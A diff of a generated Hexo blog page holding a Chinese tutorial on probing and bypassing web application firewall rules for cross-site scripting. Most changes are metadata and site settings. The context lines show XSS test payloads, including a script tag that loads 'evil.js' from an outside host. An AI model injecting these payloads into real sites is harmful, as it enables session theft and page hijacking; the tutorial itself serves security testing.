@@ -3,23 +3,26 @@
 <head>
   <meta charset="utf-8">
   
-  <title>XSS现代WAF规则探测及绕过技术 | cike home</title>
+  <title>自由人-XSS现代WAF规则探测及绕过技术 | cike home</title>
 
   <!-- keywords -->
   
+    <meta name="keywords" content="自由人">
+  
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应； 3、尝试以下的payload 1234&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;">
+  <meta name="description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；">
+<meta name="keywords" content="自由人">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS现代WAF规则探测及绕过技术">
-<meta property="og:url" content="http://yoursite.com/2019/01/09/XSS现代WAF规则探测及绕过技术/index.html">
+<meta property="og:url" content="http://www.7wawa.com/2019/01/09/XSS现代WAF规则探测及绕过技术/index.html">
 <meta property="og:site_name" content="cike home">
-<meta property="og:description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应； 3、尝试以下的payload 1234&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-09T03:16:40.598Z">
+<meta property="og:description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-09T07:13:45.138Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS现代WAF规则探测及绕过技术">
-<meta name="twitter:description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应； 3、尝试以下的payload 1234&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;">
+<meta name="twitter:description" content="XSS现代WAF规则探测及绕过技术初始测试1、使用无害的payload，类似,,观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等； 2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；">
   
     <link rel="alternative" href="/atom.xml" title="cike home" type="application/atom+xml">
   
@@ -44,7 +47,7 @@
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
 			
-			<img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+			<img lazy-src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" class="js-avatar">
 			
 		</a>
 
@@ -52,6 +55,8 @@
 		  <h1 class="header-author"><a href="/">cike</a></h1>
 		</hgroup>
 
+		
+		<p class="header-subtitle">Freedom</p>
 		
 
 		
@@ -147,6 +152,8 @@
 			  <h1 class="header-author">cike</h1>
 			</hgroup>
 			
+			<p class="header-subtitle">Freedom</p>
+			
 			<nav class="header-menu">
 				<ul>
 				
@@ -202,6 +209,7 @@
       
         <h2 id="XSS现代WAF规则探测及绕过技术"><a href="#XSS现代WAF规则探测及绕过技术" class="headerlink" title="XSS现代WAF规则探测及绕过技术"></a>XSS现代WAF规则探测及绕过技术</h2><h2 id="初始测试"><a href="#初始测试" class="headerlink" title="初始测试"></a><strong>初始测试</strong></h2><p>1、使用无害的payload，类似<b>,<i>,<u>观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&lt;&gt;等等；</u></i></b></p>
 <p>2、如果过滤闭合标签，尝试无闭合标签的payload（&lt;b,&lt;i,&lt;marquee）观察响应；</p>
+<a id="more"></a>
 <p>3、尝试以下的payload</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm      (<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://rhainfosec.com/evil.js"</span>&gt;</span><br></pre></td></tr></table></figure>
 <p>判断是否触发过滤规则，尝试使用大小写混合字符</p>
@@ -388,7 +396,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="XSS现代WAF规则探测及绕过技术" data-title="XSS现代WAF规则探测及绕过技术" data-url="http://yoursite.com/2019/01/09/XSS现代WAF规则探测及绕过技术/"  data-images="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" data-content="XSS现代WAF规则探测及绕过技术">
+<div class="ds-share share" data-thread-key="XSS现代WAF规则探测及绕过技术" data-title="XSS现代WAF规则探测及绕过技术" data-url="http://www.7wawa.com/2019/01/09/XSS现代WAF规则探测及绕过技术/"  data-images="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" data-content="XSS现代WAF规则探测及绕过技术">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
@@ -429,7 +437,7 @@
 	var yiliaConfig = {
 		fancybox: true,
 		mathjax: true,
-		animate: ,
+		animate: true,
 		isHome: false,
 		isPost: true,
 		isArchive: false,
